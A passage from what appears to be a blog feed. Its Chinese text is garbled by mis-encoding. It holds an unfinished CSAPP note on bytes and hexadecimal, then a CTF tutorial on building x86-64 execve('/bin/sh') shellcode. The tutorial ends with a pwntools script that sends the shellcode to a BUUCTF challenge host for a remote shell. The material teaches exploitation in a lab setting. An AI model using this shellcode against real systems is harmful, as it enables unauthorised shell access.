        <content type="html"><![CDATA[<h2 id="ä¿¡æ¯å­˜å‚¨"><a href="#ä¿¡æ¯å­˜å‚¨" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h2><p>å¦‚æœæè¿°ä¸€ä¸ªæˆ¿å­çš„é¢ç§¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¹³æ–¹ç±³è¿™ä¸ªå•ä½ï¼Œæè¿°ä¸€æ£µæ ‘çš„é«˜åº¦å¯ä»¥ç”¨ç±³ä¸ºå•ä½ï¼Œåˆæˆ–è€…æè¿°ä¸€ä¸ªæ²™è¢‹çš„é‡é‡å¯ä»¥ç”¨åƒå…‹ä¸ºå•ä½ï¼ŒåŒæ ·è®¡ç®—æœºä¸­çš„å†…å­˜å¤§å°ä¹Ÿæœ‰å•ä½æ¥æè¿°ã€‚</p><p>åœ¨ç¬¬ä¸€ç« çš„ç¬”è®°ä¸­æåˆ°äº† <code>bit</code> çš„æ¦‚å¿µï¼Œä¸€ä¸ªäºŒè¿›åˆ¶ä¸­çš„ <code>0</code> æˆ– <code>1</code> å°±æ˜¯ä¸€ä¸ª <code>bit</code>ï¼Œè€Œ <code>8</code> ä¸ª <code>bit</code> å°±æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼ˆ <code>byte</code> ï¼‰ã€‚æˆ‘ä»¬å¦‚æœè¯´ä¸€ä¸ªç”µè„‘çš„è¿è¡Œå†…å­˜ä¸º <code>4GB</code> ï¼Œé‚£ä¹ˆè¿™ä¸ª <code>1GB</code> å°±æ˜¯ <code>1024MB</code> ï¼Œè€Œ <code>1MB</code> å°±æ˜¯ <code>1024KB</code> ï¼Œ<code>1KB</code> æ˜¯ <code>1024B</code> æ­¤æ—¶çš„ <code>B</code> ä¹Ÿå°±æ˜¯ <code>byte</code> ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘è¯´ <code>4GB</code> ï¼Œä½ å¯èƒ½å¤§æ¦‚å°±çŸ¥é“è¿™æœ‰å¤šå°‘ä¸ª <code>0</code> æˆ– <code>1</code> äº†ï¼ˆè‡³å°‘è¿™å¤šåˆ°ä½ æ— æ³•æƒ³è±¡ï¼‰</p><p>ç°åœ¨å¤§å¤šæ•°è®¡ç®—æœºï¼ˆä¹Ÿå°±æ˜¯ <code>64</code> ä½æœºå™¨ï¼‰éƒ½ä½¿ç”¨ <code>8</code> å­—èŠ‚ä½œä¸ºæœ€å°çš„å¯å¯»å€çš„å†…å­˜å•ä½ï¼Œè€Œä¸æ˜¯ä½¿ç”¨å†…å­˜ä¸­å•ç‹¬çš„ä½ï¼ˆä¹Ÿå°±æ˜¯ <code>bit</code>ï¼‰ã€‚æœºå™¨çº§ç¨‹åºå°†å†…å­˜è§†ä¸ºä¸€ä¸ªéå¸¸å¤§çš„å­—èŠ‚æ•°ç»„ï¼Œç§°ä¸ºè™šæ‹Ÿå†…å­˜ï¼ˆä¹‹åæåˆ°çš„å†…å­˜ï¼Œé€šå¸¸é»˜è®¤æŒ‡è™šæ‹Ÿå†…å­˜ï¼Œè¿™ä¸ªè™šæ‹Ÿåœ°å€æ˜¯å±•ç¤ºç»™ç¨‹åºçš„æ¦‚å¿µæ€§æ˜ åƒï¼Œè™šæ‹Ÿä¹Ÿä¸ºå‡è±¡ï¼Œè¿™ä¸ªæ‰‹æ®µæ˜¯ç”±ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿæ¥å®ç°çš„ï¼‰ã€‚å†…å­˜ä¸­çš„<strong>æ¯ä¸ªå­—èŠ‚éƒ½æœ‰è‡ªå·±çš„åœ°å€ä¹Ÿå°±æ˜¯å”¯ä¸€æ•°å­—æ ‡è¯†</strong>ï¼Œ</p><h3 id="åå…­è¿›åˆ¶è¡¨ç¤ºæ³•"><a href="#åå…­è¿›åˆ¶è¡¨ç¤ºæ³•" class="headerlink" title="åå…­è¿›åˆ¶è¡¨ç¤ºæ³•"></a>åå…­è¿›åˆ¶è¡¨ç¤ºæ³•</h3><p>å¦‚æœäººç›´æ¥å»å¯¹ç€äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œåˆ†æï¼Œä¼šæ„Ÿåˆ°é˜…è¯»å›°éš¾ä¸”å†—é•¿ï¼Œå¦‚æœä½¿ç”¨åè¿›åˆ¶çš„è¯è™½ç„¶æ–¹ä¾¿äº†äººç±»é˜…è¯»ä½†æ˜¯ä¸ä½æ¨¡å¼çš„äº’ç›¸è½¬æ¢åˆä¼šå¾ˆéº»çƒ¦ï¼Œå› æ­¤å°±è¯ç”Ÿäº†åå…­è¿›åˆ¶è¡¨ç¤ºæ³•ã€‚<code>0 ~ 9</code> å’Œ <code>A ~ F</code> è¡¨ç¤ºäº† <code>16</code> ä¸ªå¯èƒ½çš„å€¼ã€‚ä¸€ä¸ªå­—èŠ‚çš„å€¼åŸŸä¸º <code>0 ~ 255</code> ï¼Œç”¨åå…­è¿›åˆ¶åˆ™è¡¨ç¤ºä¸º <code>0x00 ~ 0xFF</code> ï¼Œä»¥ <code>0x</code> æˆ– <code>0X</code> å¼€å¤´çš„æ•°å­—è¢«è®¤ä¸ºæ˜¯åå…­è¿›åˆ¶ã€‚å­—ç¬¦ <code>A ~ F</code> çš„å¤§å°å†™æ— æ‰€è°“ï¼Œå³ä¾¿æ˜¯ <code>0xfA1Bd</code> è¿™æ ·çš„å¤§å°å†™æ··åˆã€‚</p><p>åå…­è¿›åˆ¶å’ŒäºŒè¿›åˆ¶ç›´æ¥å¯ä»¥å¾ˆå¿«çš„è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚ <code>0x173A4C</code></p><table><thead><tr><th>åå…­è¿›åˆ¶</th><th>1</th><th>7</th><th>3</th><th>A</th><th>4</th><th>C</th></tr></thead><tbody><tr><td>äºŒè¿›åˆ¶</td><td>0001</td><td>0111</td><td>0011</td><td>1010</td><td>0100</td><td>1100</td></tr></tbody></table><p>ä½ å¯ä»¥å‘ç°åå…­è¿›åˆ¶è½¬ä¸ºäºŒè¿›åˆ¶ï¼Œä½ åªéœ€è¦çœ‹æ¯ä¸€ä¸ªæ•°å­—å°†å…¶è½¬æ¢ä¸ºå¯¹åº”äºŒè¿›åˆ¶ï¼Œæœ€åæ‹¼å‡‘èµ·æ¥å³å¯ï¼Œæ‰€ä»¥å®ƒçš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸º <code>000101110011101001001100</code></p><p>äºŒè¿›åˆ¶è½¬æ¢åå…­è¿›åˆ¶ä¹Ÿæ˜¯è¿™ä¸ªæ–¹æ³•ï¼Œä¸è¿‡å½“ä½<strong>æ€»æ•°ä¸æ˜¯ <code>4</code> çš„å€æ•°æ—¶ï¼Œéœ€è¦åœ¨æœ€å·¦ä¾§è¡¥ <code>0</code></strong> ï¼Œæœ€åå°†æ¯ä¸ª <code>4</code> ä½ç»„è½¬æ¢ä¸ºå¯¹åº”çš„åå…­è¿›åˆ¶æ•°å­—</p><p>é€»è¾‘è¿ç®—</p><p>ä½çº§è¿ç®—</p><p>ç§»ä½è¿ç®—</p><p>å­—èŠ‚é¡ºåº</p><p>å¤§ç«¯åºï¼Œå°ç«¯åº</p><h3 id="è¡¥ç "><a href="#è¡¥ç " class="headerlink" title="è¡¥ç "></a>è¡¥ç </h3><p>å­˜å‚¨ è¿ç®—ä¸è®¿é—®</p>]]></content>
      
      
      <categories>
          
          <category> è¯»ä¹¦ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPPç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcodeï¼ˆ64ä½&amp;&amp;32ä½ï¼‰ä»¥åŠå°†æ±‡ç¼–è¯­è¨€è½¬æ¢æˆæœºå™¨ç çš„æ–¹æ³•</title>
      <link href="/posts/5062ac9d.html"/>
      <url>/posts/5062ac9d.html</url>
      
        <content type="html"><![CDATA[<h1 id="1ã€ä»€ä¹ˆæ˜¯shellcode"><a href="#1ã€ä»€ä¹ˆæ˜¯shellcode" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯shellcode"></a>1ã€ä»€ä¹ˆæ˜¯shellcode</h1><p>è¿™é‡Œæˆ‘è°ˆè°ˆè‡ªå·±çš„ç†è§£ï¼Œshellcodeå°±æ˜¯ä¸€æ®µå¯æ‰§è¡Œçš„æœºå™¨ç ï¼Œå¦‚æœå¯ä»¥è®©CPUä»shellcodeé¦–å­—èŠ‚å¼€å§‹å¾€ä¸‹æ‰§è¡Œï¼Œé‚£ä¹ˆshellcodeæ‰§è¡Œå®Œæ¯•å°±ä¼šè¾¾åˆ°ç¼–å†™è€…æƒ³è¦çš„ç›®çš„ï¼ˆshellcodeä¸ä¸€å®šéè¦æ˜¯è·å–shellçš„æœºå™¨ç ï¼‰ï¼Œè‡³å°‘åˆå­¦è€…å…ˆè¿™ä¹ˆç†è§£åº”è¯¥æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ã€‚</p><h1 id="2ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcode-64ä½"><a href="#2ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcode-64ä½" class="headerlink" title="2ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcode(64ä½)"></a>2ã€æ€ä¹ˆç”¨æ±‡ç¼–è¯­è¨€æ„é€ ç®€å•çš„shellcode(64ä½)</h1><p>å‰ç½®çŸ¥è¯†ï¼š</p><p>â‘  64ä½å¯„å­˜å™¨ä¼ å‚çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨åˆ†åˆ«æ˜¯rdi,rsi,rdx</p><p>â‘¡64ä½ç³»ç»Ÿè°ƒç”¨å·é€šè¿‡æŸ¥çœ‹linuxä¸Šçš„&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.hæ–‡ä»¶å°±å¯ä»¥è·å–</p><p>â‘¢ç³»ç»Ÿè°ƒç”¨å·æ”¾å…¥raxå¯„å­˜å™¨ï¼Œç„¶åsyscallå°±å¯ä»¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°</p><p>â€‹</p><blockquote><p>   é¦–å…ˆæˆ‘ä»¬çš„<strong>ç›®çš„æ˜¯æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,0,0)</strong> ä»è€Œè·å–shell</p><p>   å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¹²ä¸‰ä»¶äº‹æƒ…</p><p>   â‘ å› ä¸ºç¨‹åºæœ¬æ¥æ˜¯æ²¡æœ‰è¿™ä¸ªexecveå‡½æ•°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨è¦å‡­ç©ºç»™å®ƒé€ ä¸€ä¸ªï¼Œå› æ­¤è¿™é‡Œç³»ç»Ÿè°ƒç”¨execveï¼ˆä½ å¯ä»¥ç†è§£ä¸ºï¼Œæ‰§è¡ŒsyscallæŒ‡ä»¤ä¹‹å‰å°†raxè£…æˆå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå°±å¯ä»¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>   â‘¡å°†ç¬¬ä¸€ä¸ªå‚æ•°å­˜å…¥â€&#x2F;bin&#x2F;shâ€</p><p>   â‘¢å°†ç¬¬äºŒä¸ªã€ç¬¬ä¸‰ä¸ªå‚.æ•°å­˜å…¥0</p></blockquote><p><strong>æˆ‘ä»¬è¦åšçš„æ˜¯åœ¨ç³»ç»Ÿè°ƒç”¨execveä¹‹å‰ï¼Œå»æŠŠéœ€è¦çš„å‚æ•°éƒ½å­˜è¿›å»ã€‚</strong></p><p>xor rdx,rdx</p><p>xor rsi,rsi  #æ­¤æ—¶å»æŠŠrsiï¼Œrdxä¸¤ä¸ªå¯„å­˜å™¨éƒ½å­˜æˆ0ï¼Œè‡³äºè¿™é‡Œä¸ºä»€ä¹ˆä¸ç”¨mov rdx,0å’Œmov rsi,0ã€‚</p><p>ä¸»è¦æ˜¯é¿å…å‡ºç°00å­—ç¬¦æ¥æˆªæ–­ï¼Œä¸è¿‡è¯è¯´ï¼Œæ®æˆ‘äº†è§£ï¼Œå¹³å¸¸å¦‚æœæ˜¯ç›´æ¥è¯»å…¥å­—ç¬¦ä¸²çš„è¯ï¼Œ00ä¹Ÿä¸ä¼šäº§ç”Ÿæˆªæ–­çš„æ•ˆæœï¼Œåªæœ‰ç”¨strcpyè¿™ç±»å‡½æ•°çš„æ—¶å€™ï¼Œæ‰è€ƒè™‘00æˆªæ–­ã€‚ä¸è¿‡é‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬å¹³å¸¸å†™shellcodeè¿˜æ˜¯è¦å°½é‡é€‰æ‹©xor rsi,rsiè€Œä¸æ˜¯mov rsi,0å‘¢ï¼Œæ˜¯å› ä¸ºxor rsi,rsiæ‰€éœ€è¦çš„å­—èŠ‚æ•°æ›´å°‘ã€‚</p><p>è¿™ä¸ªå…·ä½“æˆªæ–­çš„è¯ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ä¸¤å¼ å›¾ç‰‡<br><img src="/../img/aImdexjb53GTHuP.png"></p><p><img src="/../img/ieYVwvDbsuX9qLk.png"></p><p>å›¾ç‰‡å‡ºè‡ª<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTFä¸­å¸¸è§çš„Cè¯­è¨€è¾“å…¥å‡½æ•°æˆªæ–­å±æ€§æ€»ç»“ | Clangè£ç¼åº— (xuanxuanblingbling.github.io)</a></p><p>æ¥ç€æ˜¯å‡†å¤‡è¦æŠŠç¬¬ä¸€ä¸ªå‚æ•°å­˜å…¥rdiï¼Œä»¥å‰æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯rdiçš„å†™æˆ&#x2F;bin&#x2F;shå¯¹åº”çš„asciiç ï¼Œå¯æ˜¯ç°åœ¨æ‰æ˜ç™½ï¼Œ<font color=red>æˆ‘ä»¬åªæ˜¯è¦æŠŠ&#x2F;bin&#x2F;shå¯¹åº”çš„asciiç çš„*<u><strong>åœ°å€</strong></u>*ç»™rdiå³å¯</font>  ä¼ å‚çš„æ—¶å€™ï¼Œè¦è°ƒç”¨çš„å‡½æ•°ä¼šè‡ªå·±å»è¿™ä¸ªåœ°å€é‡Œæ‰¾åˆ°å¯¹åº”çš„&#x2F;bin&#x2F;shã€‚</p><p>å› æ­¤è¿™æ­¥è¦å†™æˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">push rdi   #æ­¤æ—¶çš„rdiæ˜¯0ï¼Œè¦æŠŠè¿™ä¸ª0å‹å…¥æ ˆé¡¶ï¼Œå½“ä¸‹é¢æŠŠ0x68732f2f6e69622få‹å…¥æ ˆé¡¶ä¹‹åï¼Œè¿™ä¸ª0å°±èµ·åˆ°äº†æˆªæ–­å­—ç¬¦ä¸²çš„ä½œç”¨ï¼ˆç”¨æ¥å£°æ˜ï¼Œexecveçš„ç¬¬ä¸€ä¸ªå‚æ•°å­—ç¬¦ä¸²åˆ°å“ªç»“æŸï¼‰</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f2f6e69622f  #ç°åœ¨rdiçš„å€¼æ˜¯0x68732f2f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi    #æ­¤æ—¶å‚æ•°0x68732f2f6e69622fï¼ˆå³/bin//sh)å°±å­˜åœ¨äº†æ ˆé¡¶çš„å†…å­˜å•å…ƒä¸­</span><br><span class="line"></span><br><span class="line">lea rdi,[rsp]     #ç­‰åŒäºmov rdi,rsp  æ­¤æ—¶æ˜¯æŠŠ**æ ˆé¡¶çš„åœ°å€**&lt;u&gt;*ï¼ˆ**ä¸€å®šè¦æ³¨æ„ï¼Œæ˜¯æ ˆé¡¶çš„åœ°å€ï¼Œå°±æ˜¯rspæœ¬èº«çš„å€¼ï¼ˆrspæœ¬èº«å°±æ˜¯ä¸ªåœ°å€ï¼‰***&lt;/u&gt;ï¼Œèµ‹å€¼ç»™rdiï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶rdiçš„å€¼å°±æ˜¯å‚æ•°çš„åœ°å€</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘è¿˜æ˜¯æƒ³è¯¦ç»†è¯´ä¸€ä¸‹ï¼Œå› ä¸ºå½“åˆæˆ‘åœ¨è¿™é‡Œè¿·äº†å¾ˆä¹…ã€‚<font color=red>rspçš„å€¼å’Œrspçš„å†…å®¹æ˜¯ä¸¤ç äº‹</font>ï¼Œä½ <strong>å¯ä»¥æŠŠä»–ä»¬ç†è§£æˆcè¯­è¨€ä¸­çš„æŒ‡é’ˆpå’Œ*pçš„å…³ç³»</strong>ã€‚<u>rspçš„å€¼ï¼Œå°±æ˜¯æ ˆé¡¶å†…å­˜å•å…ƒçš„åœ°å€ï¼›rspçš„å†…å®¹ï¼Œå°±æ˜¯æ ˆé¡¶çš„å†…å­˜å•å…ƒä¸­çš„å†…å®¹ã€‚æ­¤æ—¶rspçš„å†…å®¹æ‰æ˜¯0x68732f2f6e69622fï¼Œè€Œç°åœ¨åªæ˜¯æŠŠæ ˆé¡¶çš„åœ°å€èµ‹ç»™äº†rdiçš„å€¼</u>ã€‚</p><p>ç°åœ¨ä¹Ÿæ‰æ˜¯æˆ‘ä»¬è¦çš„æ•ˆæœï¼Œ<font color=red>rdié‡Œé¢è£…çš„æ˜¯&#x2F;bin&#x2F;&#x2F;shçš„åœ°å€ï¼Œè€Œéå‚æ•°æœ¬èº«</font>ã€‚</p><p> è¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š</p><p>â‘ è¿™ä¸ª0x68732f2f6e69622fæ˜¯&#x2F;bin&#x2F;&#x2F;shå¯¹åº”çš„asciiç ã€‚<strong>å¹¶ä¸”ä»–æ˜¯å€’ç€å­˜çš„</strong>ï¼Œå› ä¸ºasmåœ¨æŠŠæˆ‘ä»¬å†™çš„<strong>æ±‡ç¼–è¯­è¨€è½¬æ¢æˆæœºå™¨ç çš„æ—¶å€™ï¼Œä¼šå› ä¸ºå°ç«¯åºçš„åŸå› å°†è¾“å…¥çš„å†…å®¹ç»™å€’è¿‡æ¥</strong>ã€‚åˆ«çš„æœºå™¨ç æˆ‘ä»¬ä¸ç”¨æ‹…å¿ƒï¼Œ<u>ä½†æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œéœ€è¦æ‰‹åŠ¨å…ˆç»™å€’è¿‡æ¥ä¸€æ¬¡ï¼Œè¿™æ ·ç­‰åˆ°æ±‡ç¼–è¯­è¨€è½¬æ¢æˆæœºå™¨ç çš„æ—¶å€™ï¼Œå†å€’è¿‡æ¥ä¸€æ¬¡ï¼Œç¨‹åºå¤„ç†å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå°±ä¼šæ‹¿åˆ°çœŸæ­£çš„å‚æ•°&#x2F;bin&#x2F;&#x2F;shï¼Œè€Œéhs&#x2F;&#x2F;nib&#x2F;</u>ã€‚</p><p>â‘¡<strong>0x68732f2f6e69622fä¸­é—´è¿™é‡Œå‡ºç°äº†ä¸¤2f(ä¹Ÿå°±æ˜¯ä¸¤ä¸ª&#x2F;)ï¼Œå› ä¸ºè¿™é‡Œè¦å¡«å……å¤Ÿå…«ä¸ªå­—èŠ‚ï¼ˆ64ä½ç¨‹åºä¸­ï¼Œä¸€ä¸ªå†…å­˜å•å…ƒå°±åªèƒ½è£…å…«ä¸ªå­—èŠ‚ï¼‰</strong></p><p>ä¸ºäº†è¾¾åˆ°ä¸Šè¿°çš„æ•ˆæœï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è¿™ä¹ˆå†™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">push rsp</span><br><span class="line"></span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>æœ‰å¥½å‡ å¤„å†…å®¹éƒ½å˜äº†ã€‚</p><p>é¦–å…ˆæ˜¯åŸæœ¬xor rdi,rdiä¸‹é¢çš„push rdiæ²¡äº†ï¼Œå’¦ï¼Ÿéš¾é“æˆ‘ä»¬ä¸éœ€è¦å»åœ¨æ ˆä¸­å­˜å…¥ä¸€ä¸ªé›¶ï¼Œä»¥æ¥å£°æ˜å­—ç¬¦ä¸²çš„ç»“æŸä¹ˆï¼Ÿæˆ‘ä»¬ä¾ç„¶éœ€è¦ä¸€ä¸ª00æ¥å»æˆªæ–­å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æ­¤åˆ»ä½ è¿˜ä¼šå‘ç°0x68732f6e69622fä¸­é—´çš„ä¸¤ä¸ª2fç°åœ¨å°±å˜æˆäº†ä¸€ä¸ª2fï¼ˆæ­¤æ—¶å‚æ•°æ˜¯&#x2F;bin&#x2F;shï¼‰ éš¾é“æ­¤æ—¶ä¸éœ€è¦å»å¡«å……å¤Ÿå…«å­—èŠ‚ä¹ˆã€‚æ˜¯çš„ä¸éœ€è¦äº†ï¼Œ<font color=red>ç¨‹åºå‘ç°äº†æˆ‘ä»¬è¿™ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ä¸å¤Ÿå…«å­—èŠ‚ï¼Œå®ƒä¼šè‡ªå·±å¸®æˆ‘ä»¬æ·»åŠ ä¸€ä¸ª00ä¸Šå»ä»¥æ¥å‡‘é½å…«å­—èŠ‚ï¼Œå¹¶ä¸”è¿™ä¸ª00åŒæ—¶å£°æ˜äº†å­—ç¬¦ä¸²çš„ç»“æŸã€‚</font></p><p><strong>å› æ­¤æˆ‘ä»¬ä¸ä½†ä¸éœ€è¦pushä¸€ä¸ª0ï¼Œå¹¶ä¸”è¿˜ä¸ç”¨å»å¡«å……å…«å­—èŠ‚ï¼Œç¨‹åºå¸®æˆ‘ä»¬è¡¥çš„00ï¼Œæ­£å¥½å¯ä»¥å»ä»£æ›¿åŸæœ¬åº”è¯¥pushçš„0ã€‚ï¼ˆå€¼å¾—ä¸€æçš„æ˜¯å¦‚æœæˆ‘ä»¬å†…å­˜å•å…ƒåªæœ‰å…­ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆç¨‹åºä¾ç„¶ä¼šå¸®æˆ‘ä»¬è¡¥å…¨åˆ°å…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å¡«å……ä¸¤ä¸ªå­—èŠ‚çš„00ï¼‰</strong></p><p>æœ€åçš„å˜åŒ–å°±æ˜¯æŠŠåŸæœ¬çš„lea rdi,[rsp]æ¢æˆäº†ä¸€ä¸ªpush rsp ;pop rdi<strong>ï¼ˆæŠŠrspçš„å€¼å‹å…¥æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯æŠŠrspçš„å€¼å­˜å…¥äº†æ ˆé¡¶å†…å­˜å•å…ƒçš„å†…å®¹ä¸­ï¼Œå†æŠŠæ ˆé¡¶çš„å†…å­˜å•å…ƒçš„å†…å®¹å¼¹ç»™rdiçš„å€¼ï¼Œä¹Ÿå°±å®Œæˆäº†æŠŠrspçš„å€¼èµ‹ç»™äº†rdiçš„å€¼ï¼‰</strong><u><strong>ï¼ˆåœ¨è¿™é‡Œä¸€å®šè¦åŒºåˆ†æ¸…æ¥šå€¼ä¸å†…å®¹çš„å…³ç³»ï¼‰</strong></u>è¿™æ ·åšçš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿè¿™æ ·å†™çš„å­—èŠ‚æ›´å°‘ï¼ŒåŸæœ¬lea rdi,[rsp]æ˜¯å››ä¸ªå­—èŠ‚<br><img src="/../img/n5Jma4K2OYQ7BXS.png"></p><p>å³ä½¿æ¢æˆmov rdi,rsp<br><img src="/../img/w4jVgyLbMYJsPnQ.png"></p><p>ä¹Ÿè¿˜æ˜¯ä¸‰ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸ºäº†è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼Œä½¿ç”¨push rsp;pop rdiä¸¤ä¸ªæŒ‡ä»¤ï¼Œä¸€å…±ä¹Ÿæ‰ä¸¤ä¸ªå­—èŠ‚ã€‚<br><img src="/../img/LNjIfuTtpRzWJYc.png"></p><p>å› ä¸ºå¾ˆå¤šæœ‰éš¾åº¦çš„é¢˜ç›®éƒ½ä¼šé™åˆ¶shellcodeçš„é•¿åº¦ï¼Œ<em>å› æ­¤æˆ‘ä»¬æ‰€é€‰çš„shellcodeï¼Œæ˜¯è¶ŠçŸ­è¶Šå¥½ã€‚</em></p><p>æœ€åï¼Œå°±æ˜¯å°†execveå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·æ”¾å…¥raxä¸­ï¼Œç„¶åsyscallå³å¯</p><p>é‚£å‰©ä¸‹çš„æ±‡ç¼–å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line"></span><br><span class="line">mov rax,0x3b</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠåˆšæ‰æ‰€å†™çš„ä¸‰éƒ¨åˆ†æ±‡æ€»ä¸€ä¸‹å¹¶ä¸”ç²¾ç®€ä¸€ä¸‹æœ€åä»…ä»…ç”¨äº†0x1eä¸ªå­—èŠ‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="/../img/TNoUnRDAEt1FYai.png"></p><p>æ­¤æ—¶åªè¦æ‰§è¡Œè¿™ä¸ªshellcodeï¼Œå°±å¯ä»¥å»æ‹¿åˆ°shelläº†ã€‚</p><p><strong>æ³¨æ„:</strong> ç”±äºå‹å…¥å‚æ•°&#x2F;bin&#x2F;shçš„æ—¶å€™æœ€åä¸€ä¸ªé»˜è®¤è¡¥äº†00ï¼Œå¯¼è‡´ç¢°è§memcpyç­‰å‡½æ•°shellcodeä¼šè¢«æˆªæ–­ï¼Œè¿™é‡Œå¯ä»¥ç”¨&#x2F;bin&#x2F;&#x2F;shæ¥ä»£æ›¿ï¼Œæ›´æ–°è¿‡çš„shellcodeå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f2f6e69622f</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‹¿ä¸€é“BUUCTFä¸Šçš„mrctf2020_shellcodeæ¥æ¼”ç¤ºä¸€ä¸‹</p><p>ä½¿ç”¨IDAåˆ†æä¹‹åï¼ˆè¿™é“é¢˜æ— æ³•F5ï¼Œä¸è¿‡å¯ä»¥çœ‹æ±‡ç¼–æ¥åˆ†æï¼‰ï¼Œå‘ç°æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ç›´æ¥å°±è¢«æ‰§è¡Œäº†ï¼Œå› æ­¤ä»€ä¹ˆéƒ½ä¸ç”¨è€ƒè™‘ï¼Œè¿™é“é¢˜ä»…ä»…å°±æ˜¯è€ƒå¯Ÿæˆ‘ä»¬64ä½æ±‡ç¼–ç¼–å†™shellcodeçš„èƒ½åŠ›ã€‚åˆ©ç”¨pwntoolsä¸­çš„asmæŠŠåˆšæ‰å†™å¥½çš„æ±‡ç¼–å†…å®¹è½¬æ¢æˆæœºå™¨ç ï¼Œç„¶åå‘é€è¿‡å»å³å¯è·å–shellã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 